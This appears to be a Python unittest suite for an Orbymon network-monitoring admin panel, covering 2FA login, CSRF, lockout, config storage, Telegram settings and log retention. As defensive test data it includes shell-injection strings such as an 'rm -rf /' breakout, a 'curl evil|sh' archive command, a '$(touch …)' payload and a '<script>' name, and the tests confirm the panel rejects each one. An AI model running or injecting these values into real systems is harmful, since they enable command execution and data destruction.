"""Painel web: login com senha + 2FA, CSRF, bloqueio, gravacao validada das configuracoes."""
from datetime import datetime, timedelta
import json
import os
from pathlib import Path
import shutil
import subprocess
import tempfile
import time
import unittest
from unittest import mock

try:
    import flask  # noqa: F401
    HAVE_FLASK = True
except ImportError:
    HAVE_FLASK = False

from fmn_filters.admin import security
from fmn_filters.admin.config_store import ConfigStore, Paths, read_env, render_env

ROOT = Path(__file__).resolve().parent.parent
TOKEN = "123456:" + "A" * 35


class FakeStore:
    def __init__(self):
        self.rows, self.fail_log, self.audits, self.ifnames, self.next_id = {}, [], [], {}, 1

    def user(self, username=None, uid=None):
        for u in self.rows.values():
            if (username is not None and u["username"] == username) or (uid is not None and u["id"] == uid):
                return dict(u)
        return None

    def users(self):
        return [dict(u) for u in sorted(self.rows.values(), key=lambda u: u["username"])]

    def create_user(self, username, pw_hash, must_change=True):
        uid = self.next_id
        self.next_id += 1
        self.rows[uid] = {"id": uid, "username": username, "pw_hash": pw_hash, "totp_secret": None, "totp_enabled": 0,
                          "totp_last_step": -1, "must_change_password": int(must_change), "disabled": 0,
                          "created_at": None, "last_login": None}

    def set_password(self, uid, pw_hash, must_change=False):
        self.rows[uid].update(pw_hash=pw_hash, must_change_password=int(must_change))

    def set_totp(self, uid, secret, enabled):
        self.rows[uid].update(totp_secret=secret, totp_enabled=int(enabled), totp_last_step=-1)

    def use_totp_step(self, uid, step):
        if self.rows[uid]["totp_last_step"] >= step:
            return False
        self.rows[uid]["totp_last_step"] = step
        return True

    def set_disabled(self, uid, disabled):
        self.rows[uid]["disabled"] = int(disabled)

    def delete_user(self, uid):
        del self.rows[uid]

    def fail(self, ip, username):
        self.fail_log.append((ip, username))

    def fails(self, ip, username, minutes=15):
        return sum(1 for i, _ in self.fail_log if i == ip), sum(1 for _, u in self.fail_log if u == username)

    def clear_fails(self, username):
        self.fail_log = [f for f in self.fail_log if f[1] != username]

    def audit(self, username, ip, action, detail=""):
        self.audits.append((username, action, detail))

    def audit_list(self, limit=200):
        return [(None, u, "ip", a, d) for u, a, d in reversed(self.audits)][:limit]

    def interfaces(self):
        return sorted(self.ifnames.items())

    def seen_interfaces(self):
        return [(334, 9e9), (999, 1e6)]

    def upsert_interface(self, idx, name):
        self.ifnames[idx] = name

    def delete_interface(self, idx):
        self.ifnames.pop(idx, None)

    def health(self):
        return {"eventos_24h": 3}

    def recent_events(self, limit=15):
        return [(datetime(2026, 11, 1, 10, 0), "IN UDP volumetrico", "high", "in", "45.238.170.70", "100.64.64.9",
                 123456.0, 812.5)]


def make_tree(tmp: Path):
    """Arquivos como no servidor: links em /etc/orbymon apontando para managed/."""
    etc, managed, calib = tmp / "etc", tmp / "etc" / "managed", tmp / "calibration"
    managed.mkdir(parents=True)
    calib.mkdir()
    profile = json.loads((ROOT / "rules" / "cgnat-profiles.a10.json").read_text())
    (managed / "cgnat-profiles.json").write_text(json.dumps(profile))
    cfg = json.loads((ROOT / "rules" / "bidir.example.json").read_text())
    cfg["cgnat_profile_path"] = str(etc / "cgnat-profiles.json")
    (managed / "bidir.json").write_text(json.dumps(cfg))
    (managed / "telegram.env").write_text("TELEGRAM_BOT_TOKEN=%s\nTELEGRAM_CHAT_IDS=-1001\n" % TOKEN)
    (managed / "retention.env").write_text("ORBYMON_LOG_RETENTION_DAYS=15\nORBYMON_FLOW_RETENTION_DAYS=15\n")
    for name in ("bidir.json", "cgnat-profiles.json", "telegram.env", "retention.env"):
        (etc / name).symlink_to(managed / name)
        os.chmod(managed / name, 0o640)
    return {"ORBYMON_ADMIN_TESTING": "1", "ORBYMON_CONFIG": str(etc / "bidir.json"),
            "ORBYMON_TELEGRAM_ENV": str(etc / "telegram.env"), "ORBYMON_RETENTION_ENV": str(etc / "retention.env"),
            "ORBYMON_CALIBRATION_DIR": str(calib), "ORBYMON_ADMIN_BACKUP_DIR": str(tmp / "backups")}


class EnvFileTests(unittest.TestCase):
    def test_render_and_read_roundtrip(self):
        text = render_env({"A": "x y", "B": 5, "C": ""}, "teste")
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "f.env"
            p.write_text(text)
            self.assertEqual(read_env(p), {"A": "x y", "B": "5", "C": ""})

    def test_render_rejects_shell_breakout(self):
        for bad in ("a'; rm -rf /; '", "a\nB=1", "a\\"):
            with self.assertRaises(ValueError):
                render_env({"A": bad}, "teste")
        with self.assertRaises(ValueError):
            render_env({"lower": "x"}, "teste")

    def test_read_env_never_executes(self):
        with tempfile.TemporaryDirectory() as d:
            p, marker = Path(d) / "f.env", Path(d) / "pwned"
            p.write_text("X=$(touch %s)\n" % marker)
            self.assertEqual(read_env(p)["X"], "$(touch %s)" % marker)
            self.assertFalse(marker.exists())

    def test_notify_reads_env_file(self):
        from fmn_filters import notify_telegram
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "t.env"
            p.write_text(render_env({"TELEGRAM_BOT_TOKEN": TOKEN, "TELEGRAM_CHAT_IDS": "-100"}, "t"))
            sent = []

            class Fake:
                def __init__(self, token, chats):
                    sent.append((token, chats))

                def send(self, text):
                    sent.append(text)
            with mock.patch.object(notify_telegram, "Telegram", Fake):
                self.assertEqual(notify_telegram.main(["--env-file", str(p), "--test"]), 0)
            self.assertEqual(sent[0], (TOKEN, ["-100"]))


class ConfigStoreTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.env = make_tree(self.tmp)
        self.store = ConfigStore(Paths(self.env))

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def test_write_follows_symlink_keeps_mode_and_backs_up(self):
        cfg = self.store.bidir()
        cfg["cooldown_minutes"] = 33
        self.store.save_bidir(cfg)
        link = Path(self.env["ORBYMON_CONFIG"])
        self.assertTrue(link.is_symlink())
        self.assertEqual(json.loads(link.read_text())["cooldown_minutes"], 33)
        self.assertEqual(os.stat(link).st_mode & 0o777, 0o640)
        self.assertEqual(len(list((self.tmp / "backups").glob("bidir.json.*"))), 1)

    def test_invalid_network_changes_nothing(self):
        cfg, prof = self.store.bidir(), self.store.profile()
        before = Path(self.env["ORBYMON_CONFIG"]).read_text()
        prof["cgnat_pools"].append("8.8.8.0/26")            # fora dos blocos protegidos
        with self.assertRaises(ValueError):
            self.store.save_network(cfg, prof)
        self.assertEqual(Path(self.env["ORBYMON_CONFIG"]).read_text(), before)

    def test_retention_never_writes_archive_command(self):
        Path(self.env["ORBYMON_RETENTION_ENV"]).write_text("ORBYMON_ARCHIVE_CMD=curl evil|sh\n")
        self.store.save_retention(7, 9)
        text = Path(self.env["ORBYMON_RETENTION_ENV"]).read_text()
        self.assertNotIn("ARCHIVE", text)
        self.assertEqual(read_env(Path(self.env["ORBYMON_RETENTION_ENV"]))["ORBYMON_LOG_RETENTION_DAYS"], "7")

    def test_apply_calibration_only_limits(self):
        cfg = self.store.bidir()
        proposal = json.loads(json.dumps(cfg))
        proposal["rules"][0]["limits"]["dedicated"]["min_pps"] = 77777
        proposal["rules"][0]["severity"] = "critical"          # nao deve ser aplicado
        proposal["cooldown_minutes"] = 1
        (Path(self.env["ORBYMON_CALIBRATION_DIR"]) / "bidir.proposed.json").write_text(json.dumps(proposal))
        changed = self.store.apply_calibration()
        new = self.store.bidir()
        self.assertEqual(new["rules"][0]["limits"]["dedicated"]["min_pps"], 77777)
        self.assertEqual(new["rules"][0]["severity"], cfg["rules"][0]["severity"])
        self.assertEqual(new["cooldown_minutes"], cfg["cooldown_minutes"])
        self.assertEqual(len(changed), 1)


@unittest.skipUnless(HAVE_FLASK, "flask nao instalado")
class PanelTests(unittest.TestCase):
    def setUp(self):
        from fmn_filters.admin.app import create_app
        self.tmp = Path(tempfile.mkdtemp())
        self.env = make_tree(self.tmp)
        self.db = FakeStore()
        self.db.create_user("admin", security.hash_password("senha-forte-123"), must_change=False)
        self.sent = []
        sent = self.sent

        class FakeTelegram:
            def __init__(self, token, chats):
                self.token = token

            def send(self, text):
                sent.append(text)

            def call(self, method, payload=None):
                return [{"message": {"chat": {"id": -1009, "title": "NOC"}}}]
        self.app = create_app(self.db, ConfigStore(Paths(self.env)), env=self.env, telegram_factory=FakeTelegram)
        self.c = self.app.test_client()

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def csrf(self):
        self.c.get("/login")
        with self.c.session_transaction() as s:
            return s["csrf"]

    def post(self, url, **data):
        data["csrf"] = self.csrf()
        return self.c.post(url, data=data)

    def login(self, user="admin", password="senha-forte-123", now=None):
        r = self.post("/login", username=user, password=password)
        self.assertEqual(r.status_code, 302, r.data)
        u = self.db.user(username=user)
        if not u["totp_enabled"]:
            self.assertIn("/login/enroll", r.headers["Location"])
            page = self.c.get("/login/enroll")
            self.assertIn(b"data:image/svg+xml", page.data)
            with self.c.session_transaction() as s:
                secret = s["enroll_secret"]
            r = self.post("/login/enroll", code=security.totp_now(secret, now))
        else:
            r = self.post("/login/2fa", code=security.totp_now(u["totp_secret"], now))
        self.assertEqual(r.status_code, 302, r.data)
        self.assertTrue(r.headers["Location"].endswith("/"))
        return self.db.user(username=user)

    # ----- autenticacao
    def test_requires_login_and_sets_security_headers(self):
        r = self.c.get("/rede")
        self.assertEqual(r.status_code, 302)
        self.assertIn("/login", r.headers["Location"])
        r = self.c.get("/login")
        self.assertIn("script-src 'none'", r.headers["Content-Security-Policy"])
        self.assertEqual(r.headers["X-Frame-Options"], "DENY")

    def test_post_without_csrf_rejected(self):
        self.c.get("/login")
        r = self.c.post("/login", data={"username": "admin", "password": "senha-forte-123"})
        self.assertEqual(r.status_code, 400)

    def test_password_alone_is_not_enough(self):
        self.login()
        self.post("/logout")
        r = self.post("/login", username="admin", password="senha-forte-123")
        self.assertIn("/login/2fa", r.headers["Location"])
        self.assertEqual(self.c.get("/rede").status_code, 302)          # ainda sem acesso
        r = self.post("/login/2fa", code="000000")
        self.assertEqual(r.status_code, 401)

    def test_totp_code_cannot_be_reused(self):
        now = time.time()
        user = self.login(now=now)          # o codigo do passo atual foi usado na ativacao
        self.post("/logout")
        self.post("/login", username="admin", password="senha-forte-123")
        r = self.post("/login/2fa", code=security.totp_now(user["totp_secret"], now))
        self.assertEqual(r.status_code, 401)

    def test_lockout_after_failures(self):
        for _ in range(5):
            self.assertEqual(self.post("/login", username="admin", password="errada-errada").status_code, 401)
        r = self.post("/login", username="admin", password="senha-forte-123")
        self.assertEqual(r.status_code, 429)

    def test_unknown_user_same_answer(self):
        r = self.post("/login", username="naoexiste", password="qualquer-coisa")
        self.assertEqual(r.status_code, 401)
        self.assertIn("Usuário ou senha incorretos".encode(), r.data)

    def test_idle_timeout(self):
        self.login()
        with self.c.session_transaction() as s:
            s["seen"] = time.time() - 3600
        r = self.c.get("/")
        self.assertIn("/login", r.headers["Location"])

    def test_disabled_user_kicked_out(self):
        user = self.login()
        self.db.set_disabled(user["id"], True)
        self.assertEqual(self.c.get("/").status_code, 302)

    def test_must_change_password(self):
        self.db.create_user("novo", security.hash_password("provisoria-123"), must_change=True)
        self.login("novo", "provisoria-123")
        r = self.c.get("/rede")
        self.assertIn("/senha", r.headers["Location"])
        r = self.post("/senha", current="provisoria-123", new="nova-senha-segura", confirm="nova-senha-segura")
        self.assertEqual(r.status_code, 302)
        self.assertEqual(self.c.get("/rede").status_code, 200)

    # ----- paginas
    def test_status_page(self):
        self.login()
        with mock.patch("fmn_filters.admin.app.subprocess.run") as run:
            run.return_value = mock.Mock(stdout="active\n")
            r = self.c.get("/")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"IN UDP volumetrico", r.data)
        self.assertIn(b"123.456", r.data)

    def test_network_save(self):
        self.login()
        r = self.post("/rede", provider_name="Provedor X", asns="AS262687, 64500",
                      protected_cidrs="187.87.201.0/24\n45.238.170.0/23",
                      ipv6_protected_cidrs="2804:4fa8::/32", inside_private_cidrs="100.64.64.0/19",
                      extra_infrastructure_cidrs="187.87.201.193/32", a10_sources="10.100.10.10",
                      pool_rows="2", pool_cidr_0="45.238.170.64/26", pool_name_0="NAT-POOL-08", pool_users_0="32",
                      pool_cidr_1="45.238.171.192/26", pool_name_1="NAT-POOL-12", pool_users_1="16")
        self.assertEqual(r.status_code, 302)
        cfg = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        prof = json.loads(Path(cfg["cgnat_profile_path"]).read_text())
        self.assertEqual(cfg["asns"], [262687, 64500])
        self.assertEqual(cfg["provider_name"], "Provedor X")
        self.assertEqual(prof["cgnat_pools"], ["45.238.170.64/26", "45.238.171.192/26"])
        self.assertEqual(prof["cgnat_pool_metadata"]["45.238.171.192/26"]["max_users_per_ip"], 16)
        self.assertEqual(self.db.audits[-1][1], "rede_alterada")
        self.assertEqual(self.c.get("/rede").status_code, 200)

    def test_network_invalid_is_rejected(self):
        self.login()
        before = Path(self.env["ORBYMON_CONFIG"]).read_text()
        r = self.post("/rede", protected_cidrs="999.1.1.0/24", pool_rows="0")
        self.assertEqual(r.status_code, 302)
        self.assertEqual(Path(self.env["ORBYMON_CONFIG"]).read_text(), before)
        self.assertIn("Não salvo".encode(), self.c.get("/rede").data)

    def test_borders(self):
        self.login()
        self.post("/bordas", action="nome", if_index="334", if_name="Vlanif2511 (PTT)")
        self.assertEqual(self.db.ifnames[334], "Vlanif2511 (PTT)")
        page = self.c.get("/bordas")
        self.assertIn(b"Vlanif2511 (PTT)", page.data)
        self.post("/bordas", action="bordas", edge="334", extra_edges="412")
        cfg = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        self.assertEqual(cfg["observation_ifindexes"], {"in": [334, 412], "out": [334, 412]})
        self.post("/bordas", action="nome", if_index="335", if_name="<script>")
        self.assertNotIn(335, self.db.ifnames)

    def test_rules_edit(self):
        self.login()
        cfg = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        self.assertEqual(self.c.get("/regras").status_code, 200)
        data = {"cooldown_minutes": "20", "settle_minutes": "2"}
        for i, rule in enumerate(cfg["rules"]):
            if rule["enabled"]:
                data["r%d_enabled" % i] = "1"
            data["r%d_severity" % i] = rule["severity"]
            data["r%d_consecutive" % i] = str(rule["consecutive_minutes"])
        for i, rule in enumerate(cfg["nat_rules"]):
            data["n%d_enabled" % i] = "1" if rule["enabled"] else ""
            data["n%d_severity" % i] = rule["severity"]
        data["r0_dedicated_min_pps"] = "65000,5"
        self.post("/regras", **data)
        new = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        self.assertEqual(new["rules"][0]["limits"]["dedicated"]["min_pps"], 65000.5)
        self.assertEqual(new["cooldown_minutes"], 20)
        self.assertIn("min_pps", self.db.audits[-1][2])

    def test_calibration_page_and_apply(self):
        self.login()
        cfg = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        cfg["rules"][0]["limits"]["dedicated"]["min_pps"] = 1234
        calib = Path(self.env["ORBYMON_CALIBRATION_DIR"])
        (calib / "bidir.proposed.json").write_text(json.dumps(cfg))
        (calib / "relatorio-diario.json").write_text(json.dumps(
            {"periodo_utc": ["a", "b"], "minutos_com_dados": 1440, "fator": 2.0}))
        page = self.c.get("/regras")
        self.assertIn(b"1234", page.data)
        self.post("/regras", action="calibracao")
        new = json.loads(Path(self.env["ORBYMON_CONFIG"]).read_text())
        self.assertEqual(new["rules"][0]["limits"]["dedicated"]["min_pps"], 1234)

    def test_telegram_keeps_token_and_masks_it(self):
        self.login()
        page = self.c.get("/telegram")
        self.assertNotIn(TOKEN.encode(), page.data)
        self.assertIn(b"123456:", page.data)
        self.post("/telegram", token="", chats="-1001, -1002", min_severity="critical", reminder="30", close="20",
                  grafana_url="https://10.0.0.1:3000", site="POP Centro")
        values = read_env(Path(self.env["ORBYMON_TELEGRAM_ENV"]))
        self.assertEqual(values["TELEGRAM_BOT_TOKEN"], TOKEN)
        self.assertEqual(values["TELEGRAM_CHAT_IDS"], "-1001,-1002")
        self.assertNotIn(TOKEN, json.dumps(self.db.audits))           # token nunca na auditoria
        before = Path(self.env["ORBYMON_TELEGRAM_ENV"]).read_text()
        self.post("/telegram", token="", chats="-1001", min_severity="high", reminder="30", close="20",
                  site="x'; touch /tmp/x; '")
        self.assertEqual(Path(self.env["ORBYMON_TELEGRAM_ENV"]).read_text(), before)
        self.post("/telegram", action="teste")
        self.assertIn("Teste do painel", self.sent[-1])
        self.post("/telegram", action="chats")
        self.assertIn(b"-1009 (NOC)", self.c.get("/telegram").data)

    def test_retention(self):
        self.login()
        self.post("/retencao", log_days="7", flow_days="10")
        values = read_env(Path(self.env["ORBYMON_RETENTION_ENV"]))
        self.assertEqual(values, {"ORBYMON_LOG_RETENTION_DAYS": "7", "ORBYMON_FLOW_RETENTION_DAYS": "10"})

    def test_users(self):
        me = self.login()
        self.post("/usuarios", action="criar", username="operador", password="provisoria-1234")
        other = self.db.user(username="operador")
        self.assertTrue(other["must_change_password"])
        self.post("/usuarios", action="desativar", uid=str(me["id"]))
        self.assertFalse(self.db.user(uid=me["id"])["disabled"])
        self.db.set_totp(other["id"], "AAAA", True)
        self.post("/usuarios", action="reset2fa", uid=str(other["id"]))
        self.assertFalse(self.db.user(uid=other["id"])["totp_enabled"])
        self.post("/usuarios", action="excluir", uid=str(other["id"]))
        self.assertIsNone(self.db.user(username="operador"))
        self.assertEqual(self.c.get("/auditoria").status_code, 200)


class CliTests(unittest.TestCase):
    def test_create_user(self):
        from fmn_filters.admin import cli
        db = FakeStore()
        with mock.patch.object(cli.getpass, "getpass", return_value="uma-senha-boa-1"):
            self.assertEqual(cli.main(["create-user", "Admin"], store=db), 0)
        user = db.user(username="admin")
        self.assertTrue(security.verify_password("uma-senha-boa-1", user["pw_hash"]))
        self.assertEqual(cli.main(["create-user", "admin"], store=db), 1)
        self.assertEqual(cli.main(["reset-2fa", "admin"], store=db), 0)


@unittest.skipUnless(os.geteuid() == 0, "precisa de root para testar dono do arquivo")
class RetentionScriptTests(unittest.TestCase):
    def test_archive_conf_must_be_root_only(self):
        with tempfile.TemporaryDirectory() as d:
            d = Path(d)
            for sub in ("nat", "spool", "flow"):
                (d / sub).mkdir()
            old = d / "nat" / "nat-events-2026010101.tsv.gz"
            old.write_text("x")
            past = time.time() - 20 * 86400
            os.utime(old, (past, past))
            (d / "r.env").write_text("ORBYMON_LOG_RETENTION_DAYS='7'\n")
            conf = d / "a.conf"
            conf.write_text("ORBYMON_ARCHIVE_CMD=echo ARQ {}\n")
            env = dict(os.environ, ORBYMON_RETENTION_ENV=str(d / "r.env"), ORBYMON_ARCHIVE_CONF=str(conf),
                       ORBYMON_NAT_DIR=str(d / "nat"), ORBYMON_SPOOL_DIR=str(d / "spool"),
                       ORBYMON_FLOW_DIR=str(d / "flow"))
            os.chmod(conf, 0o666)
            out = subprocess.run(["bash", str(ROOT / "scripts" / "orbymon-retention.sh")], env=env,
                                 capture_output=True, text=True)
            self.assertIn("IGNORADO", out.stderr)
            self.assertNotIn("ARQ", out.stdout)
            self.assertFalse(old.exists())          # apagou sem arquivar


if __name__ == "__main__":
    unittest.main()
